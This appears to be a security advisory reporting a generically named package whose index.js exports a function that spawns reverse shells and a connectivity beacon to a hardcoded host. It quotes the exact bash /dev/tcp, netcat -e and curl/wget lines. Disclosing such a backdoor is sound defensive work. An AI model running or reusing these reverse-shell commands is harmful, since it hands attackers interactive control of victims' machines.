summary: Reverse shell and C2 beacon embedded in generically-named library
details: The package's main entry (index.js) exports a single function `command()` whose body spawns multiple reverse shells to 10.0.0.145:9999 using bash /dev/tcp redirection, netcat with -e /bin/bash, and a Python socket+subprocess one-liner, and additionally probes http://10.0.0.145:8080/check via curl/wget as a connectivity beacon. Specifically, index.js:11 runs `/bin/bash -c "bash -i >& /dev/tcp/10.0.0.145/9999 0>&1" &`, index.js:12 runs `nc 10.0.0.145 9999 -e /bin/bash &`, and index.js:5/6 invokes `curl -s http://10.0.0.145:8080/check || wget -qO- http://10.0.0.145:8080/check`. The package has no advertised functionality, no documented purpose, and a generic name; the exported API is the backdoor. Any installer that requires the package and calls `command()` immediately yields an interactive shell to the hardcoded host.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
